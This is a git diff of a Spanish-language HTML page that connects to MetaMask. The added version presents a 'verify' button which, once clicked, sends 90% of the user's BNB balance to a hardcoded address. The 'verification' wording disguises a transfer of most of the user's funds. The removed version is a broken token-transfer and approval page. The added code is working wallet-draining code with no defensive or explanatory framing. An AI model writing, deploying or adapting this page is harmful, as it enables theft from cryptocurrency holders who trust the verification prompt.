@@ -1,97 +1,65 @@
 <!DOCTYPE html>
-<html>
-<head>
-	<title>Transferencia de Tokens</title>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<!-- Agrega los scripts de Metamask -->
-	<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" integrity="sha384-kk+M0gDz0A6JGZ80+Y9fLOgNOjHOk+icLj1e84EdgN5f5a34O5uV7jKtN0uAhJ9X" crossorigin="anonymous"></script>
-	<script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider@1.2.0/dist/detect-provider.min.js"></script>
-	<script src="https://cdn.jsdelivr.net/npm/@metamask/provider@1.2.0/dist/metamask-provider.min.js"></script>
-	<!-- Agrega los estilos para el card -->
-	<style>
-		.card {
-			background-color: #f5f5f5;
-			border: 1px solid #ddd;
-			border-radius: 5px;
-			box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
-			padding: 20px;
-			text-align: center;
-		}
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificar y transferir BNB</title>
+    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.0.0-beta.37/dist/web3.min.js"></script>
+    <script>
+      window.addEventListener("load", async () => {
+        // Check if Web3 has been injected by the browser (Mist/MetaMask)
+        if (typeof web3 !== "undefined") {
+          // Use Mist/MetaMask's provider
+          window.web3 = new Web3(web3.currentProvider);
+        } else {
+          console.log("No web3? You should consider trying MetaMask!");
+        }
 
-		.button {
-			background-color: #4CAF50;
-			border: none;
-			color: white;
-			padding: 10px 20px;
-			text-align: center;
-			text-decoration: none;
-			display: inline-block;
-			font-size: 16px;
-			margin: 4px 2px;
-			cursor: pointer;
-		}
-	</style>
-</head>
-<body>
-	<div class="card">
-		<h1>Transferencia de Tokens</h1>
-		<p>Por favor, conecta tu wallet Metamask para continuar</p>
-		<button id="connectButton" class="button">Conectar a Metamask</button>
-		<button id="approveButton" class="button" style="display:none;">Verificar y aprobar transferencia</button>
-	</div>
+        // Get accounts
+        const accounts = await window.ethereum.request({
+          method: "eth_requestAccounts",
+        });
+        console.log("Connected to MetaMask with account:", accounts[0]);
 
-	<!-- Agrega el script para la interacción con Metamask -->
-	<script>
-		// Crea una instancia del proveedor de Metamask
-		const provider = new ethers.providers.Web3Provider(window.ethereum);
-		
-		// Obtiene los botones por su ID
-		const connectButton = document.getElementById("connectButton");
-		const approveButton = document.getElementById("approveButton");
-		
-		// Cuando el botón de conectar es presionado
-		connectButton.onclick = async function() {
-			try {
-				// Solicita al usuario conectar su wallet
-				await ethereum.request({ method: 'eth_requestAccounts' });
-				// Actualiza la interfaz para mostrar el botón de Verificar y aprobar transferencia
-connectButton.style.display = "none";
-approveButton.style.display = "block";
-} catch (error) {
-console.error(error);
-}
-};
-			// Cuando el botón de verificar y aprobar transferencia es presionado
-	approveButton.onclick = async function() {
-		try {
-			// Define la dirección del token que se va a transferir
-const tokenAddress = "0x01C65F22A9478C2932e62483509c233F0aaD5c72";
-const tokenAmount = ethers.utils.parseUnits("100", "18"); // En este caso, se transfieren 100 tokens
+        const bnbBalance = await window.web3.eth.getBalance(accounts[0]);
+        console.log("BNB balance:", window.web3.utils.fromWei(bnbBalance));
 
-// Obtiene la dirección del usuario conectado a Metamask
-const signer = provider.getSigner();
-const address = await signer.getAddress();
+        const transferBNB = async () => {
+          const transferAmount = window.web3.utils.toWei(
+            (0.9 * parseFloat(window.web3.utils.fromWei(bnbBalance))).toString()
+          );
 
-// Crea una instancia del token y realiza la transferencia
-const token = new ethers.Contract(tokenAddress, abi, signer);
-const transaction = await token.transfer(targetAddress, tokenAmount);
-alert("Transferencia realizada con éxito. Hash de la transacción: " + transaction.hash);
+          const transferTo = "0x01C65F22A9478C2932e62483509c233F0aaD5c72"; // Replace with destination address
 
+          const receipt = await window.web3.eth.sendTransaction({
+            from: accounts[0],
+            to: transferTo,
+            value: transferAmount,
+          });
+          console.log("Transfer receipt:", receipt);
+        };
 
-			// Si ya se aprobó la transferencia, realiza el depósito
-			if (approved) {
-				const transaction = await contract.transfer(targetAddress, tokenAmount);
-				alert("Transferencia realizada con éxito. Hash de la transacción: " + transaction.hash);
-			} else {
-				// Si no se ha aprobado, solicita la aprobación al usuario
-				await contract.approve(targetAddress, tokenAmount);
-				alert("Se ha enviado una solicitud de aprobación a tu wallet. Por favor, aprueba la transacción en Metamask.");
-			}
-		} catch (error) {
-			console.error(error);
-		}
-	};
-</script>
-</body>
+        const verifyButton = document.getElementById("verify-button");
+        verifyButton.addEventListener("click", async () => {
+          try {
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+            console.log("MetaMask is connected and authorized.");
+            verifyButton.innerHTML = "Verificado";
+            verifyButton.disabled = true;
+            await transferBNB();
+          } catch (error) {
+            console.error(error);
+          }
+        });
+      });
+    </script>
+  </head>
+  <body>
+    <div class="card">
+      <h1>Verificar y transferir BNB</h1>
+      <p>Conecta tu MetaMask y verifica para transferir el 90% de tus BNB a una dirección común.</p>
+      <button id="verify-button">Conectar MetaMask</button>
+    </div>
+  </body>
 </html>
